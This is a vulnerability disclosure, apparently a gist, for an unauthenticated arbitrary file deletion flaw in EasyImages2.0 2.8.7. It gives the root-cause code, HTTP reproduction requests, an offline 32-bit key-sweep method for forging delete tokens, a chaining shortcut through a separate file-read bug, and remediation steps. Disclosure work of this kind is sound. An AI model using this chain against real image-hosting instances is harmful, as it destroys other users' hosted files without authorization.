<!-- gist description (stage 6): EasyImages2.0 Arbitrary File Deletion -->

# EasyImages2.0 Arbitrary File Deletion

**CWE-326 · Unauthenticated arbitrary file deletion · hash-branch auth bypass + 32-bit crc32-derived delete-token key with known plaintext**

> **Vendor:** icret
> **Product:** EasyImages2.0 / EasyImage (PHP image hosting)
> **Affected version:** 2.8.7 (APP_VERSION; master branch, commit dcb9776cb9567b9280306471a66d96b4b733a0a1, 2026-08-22)
> **Affected endpoints:** GET /app/del.php?hash=<forged-token>
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

Every upload returns a delete link `app/del.php?hash=<token>`; the token is AES-128-XTS of the file path with key `(string)crc32($config['password'])` (32 bits, hardcoded tweak). In `del.php` the `$_GET['hash']` branch runs **before** the admin authentication gate, so a forged or recovered token deletes any hosted file with no session. Because anonymous upload is on by default, the attacker's own upload provides a known-plaintext/ciphertext pair, and the 2^32 key space falls to a ~14-minute offline sweep — after which tokens for any predictable `/i/YYYY/MM/DD/` path can be forged byte-identically to server-issued links.

## 2. Root Cause

| File:Line | Role |
|---|---|
| `app/del.php:24` | `if (isset($_GET['hash'])) { ... }` — delete-by-token branch, **no authentication** |
| `app/del.php:77` | `if (!is_who_login('admin')) exit('Permission denied');` — gate placed AFTER the hash branch |
| `app/function.php:561-576` | `urlHash()`: AES-128-XTS, key = `(string)crc32($config['password'])` (32-bit), hardcoded tweak `sciCuBC7orQtDhTO` |
| `app/function.php:581-608` | `getDel()`: `APP_ROOT . url` → `is_file()` + `strrpos($url, $config['path'])` → `@unlink($url)` |

```php
// app/del.php (structure)
if (isset($_GET['hash'])) {              // line 24 - reached unauthenticated
    $delHash = urlHash($_GET['hash'], 1);            // key = crc32($config['password'])
    if ($config['image_recycl']) {
        checkImg($delHash, 3, 'recycle/');           // move to recycle bin
    } else {
        getDel($delHash, 'url');                     // @unlink($url) - permanent
    }
    exit(json_encode(['code'=>200, 'msg'=>'删除成功', ...]));
}
if (!is_who_login('admin')) exit('Permission denied');   // line 77 - too late
```

```php
// app/function.php (excerpt)
if (!$key) { $key = crc32($config['password']); }    // 32-bit key, password-strength independent
$iv = 'sciCuBC7orQtDhTO';                            // hardcoded tweak
if ($mode) { return openssl_decrypt(base64_decode($data), "AES-128-XTS", $key, 0, $iv); }
```

## 3. Prerequisites

- No authentication (the hash branch precedes the admin gate).
- One legitimate delete link as a known-plaintext pair — obtainable by uploading any image (anonymous upload enabled by default, `mustLogin=0`).
- Offline compute for the key sweep (~14 min on a 16-core desktop, no GPU).

## 4. Reproduction

Step 1 — attacker uploads own canary and receives a legitimate token (known-plaintext pair):

```http
POST /app/upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----poc

------poc
Content-Disposition: form-data; name="file"; filename="canary.png"
<binary>
------poc--

HTTP/1.1 200 OK
{"result":"success","code":200,"url":"http://<HOST>/i/2026/09/29/canary.png",
 "del":"http://<HOST>/app/del.php?hash=<LEGIT_TOKEN>"}
```

Step 2 — recover the 32-bit key fully offline (trial-decrypt the known pair for every candidate; full-plaintext equality filter):

```
key = (string)i, i in [0, 2^32), AES-128-XTS, tweak 'sciCuBC7orQtDhTO'
verified sweep: full 2^32 in 850.7 s (~14 min, 16 parallel PHP workers,
~650k candidates/s single thread; 213 prefix false positives rejected)
```

Step 3 — forge a token for the target path (deterministic cipher ⇒ byte-identical to what the server itself would issue) and delete it with no session:

```http
GET /app/del.php?hash=<FORGED_TOKEN_FOR_/i/2026/09/29/victim.png> HTTP/1.1

HTTP/1.1 200 OK
{"code":200,"msg":"删除成功","type":"success","icon":"ok-sign","mode":"delete",
 "url":"\/i\/2026\/09\/29\/victim.png"}
```

Contrast control — without a `hash` parameter the gate applies:

```http
POST /app/del.php HTTP/1.1
mode=delete&url=/i/2026/09/29/xxx.png

Permission denied
```

Both configured deletion modes were exercised: `image_recycl=1` (default) moves the file to `/i/recycle/` (file gone from its URL); `image_recycl=0` permanently unlinks it from disk.

## 5. Confirmed Techniques

- Full attacker chain executed on a fresh install with a random admin password (bcrypt; the attacker never sees it): own-upload token → offline 2^32 sweep (850.7 s, 16 workers, recovered key matched ground truth) → forged token for another file → unauthenticated `code 200` deletion.
- Verified in both modes: recycle (`image_recycl=1`) and permanent unlink (`image_recycl=0`).
- Forged tokens are byte-identical to server-issued links (deterministic XTS with fixed tweak).
- Chaining shortcut: the hide.php arbitrary file read (separate submission) exposes `config/config.php`, from which `crc32(password hash)` yields the key in milliseconds — no brute force needed.

## 6. Impact

- Unauthenticated deletion of any hosted image; paths follow the predictable `/i/YYYY/MM/DD/` layout, so content can be targeted or mass-deleted (hosting-integrity/availability loss for all users of the instance).
- With the recycle-bin mode off, deletion is permanent — user data destruction.
- `<REDACTED>` — no credentials are required and none are disclosed by this flaw itself; the admin password strength is irrelevant to the 32-bit key derivation.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H` (Base 7.4, High)

## 8. Remediation

1. Move the `$_GET['hash']` branch behind the `is_who_login('admin')` gate (or require an authenticated, authorized delete session for all paths).
2. Replace the `crc32($config['password'])` key derivation with a random per-install 256-bit key stored outside predictable config constants.
3. Validate the resolved path stays under the uploads root (`realpath()` + prefix check) before `@unlink()`.
4. Consider requiring a per-file random secret in delete links (not derivable from the global password).

## 9. References

- Project: https://github.com/icret/EasyImages2.0
- CWE-326: https://cwe.mitre.org/data/definitions/326.html
- External disclosure: https://gist.github.com/qianqiusujiu/e010a2bf7045e14410b1ecf121e2eb47
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
